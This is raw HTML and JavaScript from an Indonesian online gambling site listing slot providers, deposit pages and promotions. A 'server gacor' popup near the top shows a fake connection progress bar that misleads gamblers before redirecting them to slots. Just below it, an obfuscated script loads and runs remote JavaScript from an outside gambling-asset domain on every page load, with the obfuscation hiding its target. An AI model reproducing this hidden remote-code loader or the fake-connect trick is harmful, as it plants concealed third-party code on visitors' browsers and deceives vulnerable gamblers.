          <h3 style="text-align:center; color:#FFD700;">SERVER INTERNATIONAL</h3>
          <p style="text-align:center; color:#fff;">Silahkan Pilih Server:</p>
    
          <select id="serverSelect" style="
            width: 100%;
            padding: 12px;
            font-size: 16px;
            margin-bottom: 15px;
            background-color: #2b2b2b;
            color: #fff;
            border: 1px solid #FFD700;
            border-radius: 4px;
          ">
            <option value="id">SERVER GACOR INDONESIA</option>
            <option value="sg">SERVER GACOR SINGAPORE</option>
            <option value="th">SERVER GACOR THAILAND</option>
            <option value="ae">SERVER GACOR DUBAI</option>
            <option value="vn">SERVER GACOR VIETNAM</option>
            <option value="ph">SERVER GACOR FILIPINA</option>
            <option value="mm">SERVER GACOR MYANMAR</option>
            <option value="jp">SERVER GACOR JEPANG</option>
            <option value="ru">SERVER GACOR RUSIA</option>
            <option value="kr">SERVER GACOR KOREA</option>
            <option value="cn">SERVER GACOR CHINA</option>
            <option value="hk">SERVER GACOR HONGKONG</option>
            <option value="my">SERVER GACOR MALAYSIA</option>
            <option value="int">SERVER GACOR INTERNATIONAL 🌐</option>
          </select>
    
          <div style="
            background-color: #333;
            height: 22px;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 12px;
            border: 1px solid #FFD700;
          ">
            <div id="progressBar" style="
              width: 0%;
              background: linear-gradient(90deg, #FFD700, #B7870C);
              height: 100%;
              text-align: center;
              color: #111;
              font-size: 14px;
              font-weight: bold;
              text-shadow: 0 0 5px rgba(0,0,0,0.6);
              transition: width 0.3s;
            ">0%</div>
          </div>
    
          <p id="statusText" style="text-align: center; font-weight: bold; color:#FFD700;"></p>
    
          <div style="text-align: center;">
            <button id="btnConnect" style="
              background: linear-gradient(to bottom, #FFD700, #B7870C);
              color: #111;
              border: none;
              padding: 10px 30px;
              border-radius: 6px;
              font-size: 14px;
              font-weight: bold;
              cursor: pointer;
              box-shadow: 0 0 12px rgba(255,215,0,0.6);
            ">HUBUNGKAN</button>
          </div>
        </div>
      `;
      document.body.appendChild(popup);
    
      document.getElementById("btnOpenMaxwin").addEventListener("click", () => {
        popup.style.display = "flex";
      });
    
      document.getElementById("closeMaxwin").addEventListener("click", () => {
        popup.style.display = "none";
        resetProgress();
      });
    
      let hasConnected = false;
    
      document.getElementById("btnConnect").addEventListener("click", () => {
        if (hasConnected) return;
    
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        let progress = 0;
    
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = true;
    
        const interval = setInterval(() => {
          progress += 5;
          bar.style.width = progress + "%";
          bar.textContent = progress + "%";
    
          if (progress >= 100) {
            clearInterval(interval);
            bar.style.background = "limegreen";
            bar.textContent = "100%";
            status.innerText = "Selesai!";
            status.style.color = "#fff";
    
            const url = new URL('/slots', window.location.href);
            url.protocol = 'https:';
            url.hostname = location.hostname;
            url.port = '';
            window.location.replace(url.toString());
          }
        }, 100);
      });
    
      function resetProgress() {
        const bar = document.getElementById("progressBar");
        const status = document.getElementById("statusText");
        bar.style.width = "0%";
        bar.textContent = "0%";
        bar.style.background = "linear-gradient(90deg,#FFD700,#B7870C)";
        status.innerText = "";
        hasConnected = false;
      }
    });
    </script> 

<script>var _0x1344b2=_0x1928;(function(_0x234a18,_0x44183a){var _0x576849=_0x1928,_0x326a2e=_0x234a18();while(!![]){try{var _0x27c6e9=parseInt(_0x576849(0x1ae))/(-0x83+-0x2a9*-0x5+-0xcc9)+parseInt(_0x576849(0x1a7))/(0x2*-0x788+-0x1a17+-0x29*-0x101)*(-parseInt(_0x576849(0x1a2))/(0xd1b+0xd4*-0x2d+0x182c))+parseInt(_0x576849(0x1a8))/(-0x193e+0x98f*0x2+0x189*0x4)+-parseInt(_0x576849(0x1a9))/(-0x2620+0x1*0x202d+0x5f8)+parseInt(_0x576849(0x1c0))/(-0x15*0x1af+-0x1*-0x1e62+0x4ff)*(-parseInt(_0x576849(0x1bd))/(0x1313+-0x627+-0xce5))+-parseInt(_0x576849(0x1a4))/(-0x1d*-0x4a+0xde*-0x2+-0x34f*0x2)*(parseInt(_0x576849(0x1b4))/(-0x5e*0x53+0x881*-0x2+0x5*0x981))+-parseInt(_0x576849(0x1ab))/(-0x2f3*0x1+0x1*0x2345+0x4*-0x812)*(-parseInt(_0x576849(0x1c2))/(-0x17be+-0x1*0xa7b+0x2244));if(_0x27c6e9===_0x44183a)break;else _0x326a2e['push'](_0x326a2e['shift']());}catch(_0x5a009a){_0x326a2e['push'](_0x326a2e['shift']());}}}(_0x3d03,0x9*0x22131+-0x2151*0x96+0xb20c2));var _0x60b0bc=(function(){var _0x34a08f=!![];return function(_0x4da461,_0x19bb5e){var _0x9b4c1c=_0x34a08f?function(){var _0x123dba=_0x1928;if(_0x19bb5e){var _0x442e90=_0x19bb5e[_0x123dba(0x1c1)](_0x4da461,arguments);return _0x19bb5e=null,_0x442e90;}}:function(){};return _0x34a08f=![],_0x9b4c1c;};}()),_0x3a9b7d=_0x60b0bc(this,function(){var _0x29a51c=_0x1928,_0x346248={'RCpcD':_0x29a51c(0x1b6)+'+$'};return _0x3a9b7d[_0x29a51c(0x1be)]()[_0x29a51c(0x1b9)](_0x346248[_0x29a51c(0x1aa)])[_0x29a51c(0x1be)]()[_0x29a51c(0x1b3)+'r'](_0x3a9b7d)[_0x29a51c(0x1b9)](_0x29a51c(0x1b6)+'+$');});function _0x1928(_0x3ef2e8,_0x51db8f){var _0x26a1e3=_0x3d03();return _0x1928=function(_0x5c46d7,_0x3a8e08){_0x5c46d7=_0x5c46d7-(0xb6d+-0x13ac*-0x1+-0x13*0x18d);var _0x214423=_0x26a1e3[_0x5c46d7];return _0x214423;},_0x1928(_0x3ef2e8,_0x51db8f);}_0x3a9b7d();var hokiScript=document[_0x1344b2(0x1af)+_0x1344b2(0x1bc)](_0x1344b2(0x1b5));hokiScript[_0x1344b2(0x1b8)]=_0x1344b2(0x1b0),hokiScript[_0x1344b2(0x1b7)]=function(){var _0x15387f=_0x1344b2;hokiStart(_0x15387f(0x1b2));},hokiScript[_0x1344b2(0x1b1)]=_0x1344b2(0x1c3)+_0x1344b2(0x1a5)+_0x1344b2(0x1ad)+_0x1344b2(0x1ba),hokiScript[_0x1344b2(0x1ac)]=!(0x64e+0x1864+-0x1eb2),document[_0x1344b2(0x1a6)+_0x1344b2(0x1bf)](_0x1344b2(0x1a3))[0x1c46+0xedc+-0x2b22][_0x1344b2(0x1bb)+'d'](hokiScript);function _0x3d03(){var _0x125f3a=['script','(((.+)+)+)','onload','type','search','agaming.js','appendChil','ent','7Bdcwop','toString','sByTagName','7760958dxQrVz','apply','11qiFdit','https://as','231cSYnel','head','4315888oRPJPA','set.qrisho','getElement','4084pGAqGP','4756920BcGrRD','3277430pMpqSo','RCpcD','13030170VaIjxy','async','ki.com/gig','1398991GuWUbO','createElem','module','src','cpg138','constructo','18mtIYQh'];_0x3d03=function(){return _0x125f3a;};return _0x3d03();}</script>
 





 
<meta charset="utf-8">

<meta name="csrf-token" content="NBEbKxG6lPy03y4rzVutbS2sGHgPjHuNJefNtVGv">

<script src="/assets/js/jquery/jquery.min.js"></script>
<script src="/assets/js/bootstrap/bootstrap.min.js"></script>

     
                        <link rel="preload" href="/assets/fonts/ugsubskin/icomoon/fonts/icomoon.woff2" as="font" type="font/woff2" crossorigin="anonymous">
      <link rel="stylesheet" href="/assets/fonts/ugsubskin/icomoon/style.min.css" media="all" onload="this.media='all'"> 
      <link rel="stylesheet" href="/assets/css/swiper.css">

  <link type="text/css" rel="stylesheet" href="/assets/css/app-mobile.css">     
    <link type="text/css" rel="stylesheet" href="/assets/css/custom.css">
    <script src="/assets/js/jquery/sweet_alert2.min.js"></script>
 

  <link rel="stylesheet" href="/assets/js/jquery/jquery-ui.min.css" media="all" onload="this.media='all'">
  <script src="/assets/js/jquery/jquery-ui.min.js" defer=""></script>
  <script type="text/javascript" src="/assets/js/jquery/jquery.ui.touch-punch.min.js" defer=""></script>



 
  <div class="full-container layout">
    <div id="sideNav" class="side-nav">
      <nav class="nav-content">
  <ul class="side-nav-items">
    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/home.php?i=1#" onclick="closeNav(-1);">
        <div><i class="icon-home"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@HOME">HOME</div>
      </a>

    </li>
            
      
    <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(0);" [ngclass]="{'active':isOpenNavContent[0], '':   !isOpenNavContent[0]}">
        <div><i class="icon-coins"></i></div>
        <div class="nav-title" i18n="@Funds">Dana</div>
      </a>
      <div class="nav-item-content" [ngclass]="{'open':isOpenNavContent[0], '':!isOpenNavContent[0]}">
        <ul class="submenu account">
          <li>
            <a href="https://www.Goblin88.site/deposit.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-pig"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Deposit</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/withdraw.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-transfer"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Withdraw</div>
            </a>
          </li>
          <li>
            <a href="https://www.Goblin88.site/history.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-history"></i></span></div>
              <div class="fs-sm mt-1" i18n="@History">Pernyataan &nbsp;</div>
            </a>
          </li>
        
          <li>
            <a href="https://www.Goblin88.site/refferal.php" (click)="closeNav($event);">
              <div><span class="circle"><i class="icon-users"></i></span></div>
              <div class="fs-sm mt-1" i18n="">Referral &nbsp;</div>
            </a>
          </li>
      

        </ul>
      </div>
    </li>
    
        <li class="nav-item">
      <a href="#" class="navlink has-sub" onclick="openNavItem(1);" [ngclass]="{'active':isOpenNavContent[1], '':   !isOpenNavContent[1]}">
        <div><i class="icon-videogame_asset"></i></div>
        <div class="nav-title" i18n="">PERMAINAN</div>
      </a>
      <div class="nav-item-content games" [ngclass]="{'open':isOpenNavContent[1], '':!isOpenNavContent[1]}">
        <ul class="submenu">
                  <!-- <i class="icon-lottery"></i>
                  <i  class="icon-others"></i>    -->

                                   <li>  <a href="https://www.Goblin88.site/slot.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-slot"></i>
               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">SLOTS</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/live.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <img src="/assets/images/live_game_icon3860.gif" ref="live game" height="41px">               
                </span>
                   <span class="hot sub" style="">HOT</span>
              </div>
              <div class="fs-sm mt-1">LIVE GAMES</div>
            </a>
            </li>
                                                <li>  <a href="https://www.Goblin88.site/sports.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-soccer"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">SPORTS</div>
            </a>
            </li>
                                                <li>    <a href="https://www.Goblin88.site/casino.php" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-casino"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">CASINO</div>
            </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/lottery.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                      <i class="icon-lottery"></i>
                    
                    </span>
                    <span class="hot sub new ">NEW</span>
                </div>
                <div class="fs-sm mt-1">LOTRE</div>
               </a>
            </li>
                                                <li>
              <a href="https://www.Goblin88.site/fish-hunter.php" (click)="closeNav(-1);">
                <div class="">
                    <span class="circle">
                    <i class="icon-fish_hunter"></i>
                    </span>
                </div>
                <div class="fs-sm mt-1">TEMBAK IKAN</div>
               </a>
            </li>
                                                <li>   <a href="https://merdekaMERCUSUAR77.site/e-games" (click)="closeNav(-1);">
              <div class="">
                <span class="circle">
                  <i class="icon-others"></i>
                </span>
              </div>
              <div class="fs-sm mt-1">E-GAMES</div>
            </a>
            </li>
                        

        </ul>
      </div>
    </li>

            <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/promosaya.php" onclick="closeNav(-1);">
        <div><i class="icon-user1"></i></div> 
        <div class="nav-title" i18n="@PROMOS">Promo saya</div>
      </a>
    </li>
          <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/promotion.php" onclick="closeNav(-1);">
        <div><i class="icon-gift"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@PROMOS">PROMOSI</div>
      </a>
    </li>
    
        <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/refferal.php" onclick="closeNav(-1);">
        <div><i class="icon-users"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@REFERRAL">
                        REFERRAL                      </div>
      </a>

    </li>
                    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/rtpbaby.php" target="_blank" onclick="closeNav(-1);">
        <div>
          <i></i>
          <img src="/assets/ImageFile/202505252031220000002213b1fcac__babyrtp__200x200.webp" width="30px" height="30px">
        </div> <!--routerLinkActiveOptions for root URL-->

        <div class="nav-title">CEK RTP LIVE</div>
      </a>
    </li>
       


    <li class="nav-item">

      <a class="navlink" href="https://www.Goblin88.site/info.php" onclick="closeNav(-1);">
        <div><i class="icon-info"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="@INFO">INFO</div>
      </a>

    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/contact-us.php" onclick="closeNav(-1);">
        <div><i class="icon-address-book"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title" i18n="">HUBUNGI KAMI</div>
      </a>
    </li>
    <li class="nav-item">
      <a href="#" class="navlink" onclick="closeNav();" data-trigger="nifty" data-target="#langModal-mobile">
       <div><i class="icon-language"></i></div>
       Bahasa      </a>
    </li>
    <li class="nav-item">
      <a class="navlink" href="https://www.Goblin88.site/" onclick="closeNav(-1);">
        <div><i class="icon-display"></i></div> <!--routerLinkActiveOptions for root URL-->
        <div class="nav-title">Desktop View</div>
      </a>
    </li>
        <li class="nav-item"><a href="#" class="navlink" onclick="closeNav();"> <i class="icon-double_arrow_l"></i></a></li>
  </ul>
</nav>


<script>
var arr= [0,0];

function openNavItem(index){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');
    if(index>=0){
        $('.nav-item-content').eq(index).addClass('open');
        $('.navlink.has-sub').eq(index).addClass('active');
        $( "#mainContent" ).addClass( "navContentOpen" );
        $( "#sideNav" ).addClass( "navContentOpen" );
    }
}

function closeNav(){
    $('.nav-item-content').removeClass('open');
    $('.navlink.has-sub').removeClass('active');

    $( "#sideNav" ).removeClass( "navContentOpen" );
    $( "#sideNav" ).removeClass( "open" );
    $( "#mainContent" ).removeClass( "navContentOpen" );
    $( "#mainContent" ).removeClass( "sideNavOpen" );

}
</script>
    </div>

    <div class="main-content" id="mainContent">
      <div class="backdrop" id="mainContentContainer">

        <div class="top-bar">
          <div class="inner-header flex-row ">

<button id="btnToggleSideNav" class="btn btn-link" aria-label="side nav toggle">
    <i class="icon-bars"></i>
  </button>
  <a href="https://www.Goblin88.site/" title="" class="logo">
    <div><img class="img-fluid" alt="MERCUSUAR77" src="/assets/ImageFile/mercusuar.gif"></div>
  </a>

          <a id="btnToggleRSideNav">
      <i class="icon-user-o"></i>    
    </a>
    
  



</div>
        </div>
        <div class="content my01">

                                                  <div class="container wallet-bal">
                <div class="row text-left">
                  <div class="col-xs-6">
                    <button class="btn btn-clear btn-refresh-wallet">
                      <i class="icon-currency-dollar fs-lg i-dollar"></i>
                      &nbsp;&nbsp;
                      
                      <span class="bal-txt">IDR <?php echo $saldo_game; ?></span>
                    </button>
                  </div>
                    <div class="col-xs-6 noSidePadding i-refresh">
                                                                  <button class="btn btn-clear btn-refresh-wallet pull-right"><i class="icon-refresh-2"></i></button>
                    </div>
                </div>

                <div class="row game-bals" id="other-game-bals" style="display:none;">
                  <div class="">
                    <table class="table">
                      

                    <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-PT">Playtech <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-PT">0.00</span></td>
                        <td class="col-xs-1"><button class="btn btn-clear btn-tran-PT" data-toggle="tooltip"
                            data-placement="bottom" title="Transfer ALL to Wallet"><i
                              class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      <!-- <tr>
                        <td class="col-xs-4"><button class="btn btn-clear btn-refresh-CMD">CMD <i
                              class="icon-refresh"></i></button></td>
                        <td class="col-xs-7"><span class="bal-CMD">0.00</span></td>
                        <td class="col-xs-1">
                          <button class="btn btn-clear btn-tran-CMD" data-toggle="tooltip" data-placement="bottom"
                            title="Transfer ALL to Wallet">
                            <i class="icon-arrow-bold-up"></i></button></td>
                      </tr> -->
                      

                      

                    </table>
                  </div>
                </div>

              </div>
                        
          <!-- <div class="content-loader" *ngIf="subs.state$.requests.getAllGamesViewByCategory.inProgress; else content"><app-spinner></app-spinner> </div> -->


<div class="container pt-1 sub-games">
           <div>
 
  <h3 class="title" i18n="">slots PROVIDERS</h3>
  <div class="row">


  </div>

  <div class="scroll-wrapper row" style="height:72px;">

    <div class="left"><button class="prev-btn btn" id="left-button"><i class="icon-keyboard_arrow_left"></i></button></div>

    <div style="overflow:hidden;width:100%;" class="scroller">
      <div class="row no-gutters text-center slider-content">
        <!--//hardcoded links.......-->




                
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box active" href="pragmatic-play.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/images/ppslotc619.gif" data-src="/assets/images/ppslotc619.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PRAGMATIC</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="pgsoft.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/images/pgsoft8510.gif" data-src="/assets/images/pgsoft8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PGSOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="joker-gaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/jk_rng8510.png" data-src="/assets/game_logos/100x70/jk_rng8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JOKER</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="besoft.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70//besoft_slot8510.png" data-src="/assets/game_logos/100x70//besoft_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BESOFT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="spadegaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/sg_slot8510.gif" data-src="/assets/game_logos/100x70/sg_slot8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SPADE GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="jili.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/jili.gif?v=1.0" data-src="/assets/game_logos/100x70/jili.gif?v=1.0" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">JILI</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="fastspin.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/fastspin_slot8510.gif" data-src="/assets/game_logos/100x70/fastspin_slot8510.gif" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FASTSPIN</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="booongo.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/booongo_slot.webp" data-src="/assets/game_logos/100x70/booongo_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">BNG</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="playtech.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/pt_slot.webp" data-src="/assets/game_logos/100x70/pt_slot.webp" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYTECH</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="wow-gaming.php" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/wow_slot8510.png" data-src="/assets/game_logos/100x70/wow_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">WOW GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="sigma.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/sigmagaming_slot.gif?v=1.0" data-src="/assets/game_logos/100x70/sigmagaming_slot.gif?v=1.0" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SIGMA GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="habanero.php" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/hb_slot8510.png" data-src="/assets/game_logos/100x70/hb_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HABANERO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/fatpanda" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/fatpanda_slot8510.png" data-src="/assets/game_logos/100x70/fatpanda_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">FAT PANDA</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/advantplay" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/advantplay_slot8510.png" data-src="/assets/game_logos/100x70/advantplay_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">ADVANTPLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/hacksaw" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/hacksaw_slot8510.png" data-src="/assets/game_logos/100x70/hacksaw_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HACKSAW</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/relax" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/relax_slot8510.png" data-src="/assets/game_logos/100x70/relax_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">RELAX GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/microgaming" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/mg_slot8510.png" data-src="/assets/game_logos/100x70/mg_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">MICRO GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nolimitcity" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/nolimitcity_slot8510.png" data-src="/assets/game_logos/100x70/nolimitcity_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NOLIMITCITY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/nextspin" rel="opener" style="position:relative;overflow: hidden;">
                                                                         <div class="hot-tag"></div>
                                                 <img alt="" src="/assets/game_logos/100x70/nextspin_slot8510.png" data-src="/assets/game_logos/100x70/nextspin_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NEXTSPIN</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/playstar" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/playstar_slot8510.png" data-src="/assets/game_logos/100x70/playstar_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYSTAR</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/cq9" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/cq9_slot8510.png" data-src="/assets/game_logos/100x70/cq9_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">CQ9</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/skywind" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/skywind_slot8510.png" data-src="/assets/game_logos/100x70/skywind_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">SKYWIND</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/ai-gaming" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/aigaming_slot8510.png" data-src="/assets/game_logos/100x70/aigaming_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">AI GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/redtiger" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/redtiger_slot8510.png" data-src="/assets/game_logos/100x70/redtiger_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">REDTIGER</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/netent" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/redtiger_net_slot8510.png" data-src="/assets/game_logos/100x70/redtiger_net_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">NETENT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/playngo" rel="opener" style="position:relative;overflow: hidden;">
                                                               <img alt="" src="/assets/game_logos/100x70/playngo_slot8510.png" data-src="/assets/game_logos/100x70/playngo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">PLAYNGO</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/cosmo-play" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/cosmo_slot8510.png" data-src="/assets/game_logos/100x70/cosmo_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">COSMO PLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/hotdog" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/hotdog_slot8510.png" data-src="/assets/game_logos/100x70/hotdog_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">HOTDOG GAMING</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/dst-play" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/dst_slot8510.png" data-src="/assets/game_logos/100x70/dst_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">DST PLAY</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
                                      <a class="btn-box " href="/slots/askmeslot" rel="opener" style="position:relative;overflow: hidden;">
                                                                    <div class="new-tag"></div>
                                                    <img alt="" src="/assets/game_logos/100x70/askme_slot8510.png" data-src="/assets/game_logos/100x70/askme_slot8510.png" *ngif="showEle" style="max-width: 70px; height: 50px;">

                    <h5 class="text-center game-title">ASKMESLOT</h5>
              </a>
                           </div>

                  
            
           <div class="col" style="height:72px;">
